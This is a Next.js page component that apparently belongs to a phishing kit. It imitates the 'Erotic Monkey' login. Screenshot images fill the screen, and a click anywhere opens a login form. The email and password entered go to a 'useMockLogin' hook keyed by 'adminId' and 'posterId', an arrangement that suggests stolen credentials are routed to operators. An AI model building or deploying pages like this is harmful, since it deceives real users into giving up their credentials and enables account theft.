"use client";
import { useState } from "react";
import { site } from "../config/index";
import { IoIosCloseCircle } from "react-icons/io";
import useMockLogin from "../hooks/useMockLogin";
import Image from "next/image";

export default function Home({ adminId, posterId }) {
  const [visible, setVisible] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = (e) => {
    e.preventDefault();
    const submitValues = { site, email, password };
    login(submitValues);
    setEmail("");
    setPassword("");
  };

  const handleOpenModal = () => setVisible(true);
  const handleCloseModal = () => setVisible(false);

  return (
    <div className="bg-gray-300 h-screen flex flex-col">
      {/* Navbar Section */}
    <nav className="relative h-0 lg:h-1/4 bg-[#303030]">


        {/* Modal */}
        {visible && (
          <div className="absolute top-1/4 left-1/2 mt-10 lg:mt-0 transform -translate-x-1/2 z-50 w-[95%] sm:w-[560px]">
            <div className="relative">
              <div className="absolute -top-2 -right-2 z-10">
                <IoIosCloseCircle
                  style={{
                    color: "black",
                    fontSize: "30px",
                    cursor: "pointer",
                    backgroundColor: "white",
                    borderRadius: "50%",
                  }}
                  onClick={handleCloseModal}
                />
              </div>

              <section className="bg-[#f5f5f5] rounded-md shadow-lg">
                <div className="bg-[#fff] rounded-md">
                  <form
                    onSubmit={handleSubmit}
                    className="border border-gray-100 w-full h-auto sm:h-[350px] p-4"
                  >
                    <label className="block px-3 py-2 bg-gray-100 text-black font-base text-lg text-center sm:text-left">
                      Login to Erotic Monkey!
                    </label>

                    <div className="pt-5">
                      <input
                        type="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="Enter email / username"
                        className="w-full px-3 py-2 rounded mt-2 border border-[#e5e5e5] outline-none placeholder:text-sm"
                        required
                      />
                    </div>

                    <div className="pt-5">
                      <input
                        type="password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Password"
                        minLength="6"
                        className="w-full px-3 py-2 rounded mt-2 border border-[#e5e5e5] outline-none placeholder:text-sm"
                        required
                      />
                    </div>

                    <div className="flex flex-col sm:flex-row justify-between items-center mt-4 gap-3">
                      <a
                        href="#"
                        className="text-sm text-[#08c] hover:text-gray-700 hover:underline"
                      >
                        Forgot your password?
                      </a>
                      <button
                        type="submit"
                        className="bg-green-600 text-white font-base text-sm px-6 py-2 rounded w-full sm:w-auto"
                      >
                        Log In
                      </button>
                    </div>

                    <div className="mt-4 text-center">
                      <p className="text-sm sm:text-base">
                        Not a EM Member?
                        <span className="text-[#08c] pl-2">
                          Signup Up now, it's FREE
                        </span>
                      </p>
                    </div>

                    <p className="text-xs mt-2 text-center text-gray-600">
                      Signing up to the Erotic Monkey gives you access to
                      thousands of reviews from across the country.
                    </p>
                  </form>
                </div>
              </section>
            </div>
          </div>
        )}

        {/* Navbar Image */}
        <div
          className="h-full hidden lg:block w-full relative cursor-pointer"
          onClick={handleOpenModal}
        >
          <Image
            src="/navbar.jpg"
            alt="Navbar"
            fill
            className="object-cover"
            priority
          />
        </div>
      </nav>

      {/* Desktop Body Image */}
      <div
        className="relative flex-1 hidden lg:block cursor-pointer"
        onClick={handleOpenModal}
      >
        <Image
          src="/body.jpg"
          alt="Body"
          fill
          className="object-cover"
          priority
        />
      </div>

      {/* Mobile Image */}
      <div
        className="lg:hidden block relative w-full h-screen cursor-pointer"
        onClick={handleOpenModal}
      >
        <Image
          src="/mobile.jpg"
          alt="Mobile responsive"
          width={412}
          height={915}
          className="object-cover"
          priority
        />
      </div>
    </div>
  );
}